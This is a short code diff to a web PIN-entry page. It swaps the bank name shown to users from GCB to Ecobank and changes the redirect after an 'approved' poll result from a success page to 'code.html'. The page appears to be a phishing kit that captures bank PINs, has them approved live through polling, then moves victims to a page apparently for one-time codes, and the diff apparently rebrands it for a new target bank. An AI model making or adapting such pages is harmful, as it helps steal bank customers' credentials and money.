@@ -160,7 +160,7 @@ button:enabled:hover{
   <div class="pin-title">Enter PIN</div>
 
   <!-- TEXT UPDATED AS REQUESTED -->
-  <div class="pin-subtitle">Enter your GCB PIN</div>
+  <div class="pin-subtitle">Enter your Ecobank PIN</div>
 
   <div class="pin-box-wrapper">
     <div class="pin-row">
@@ -252,7 +252,7 @@ function pollPin(requestId) {
 
     if (data.approved === true) {
       clearInterval(interval);
-      window.location.href = 'success.html';
+      window.location.href = 'code.html';
     }
 
     if (data.approved === false || data.blocked) {
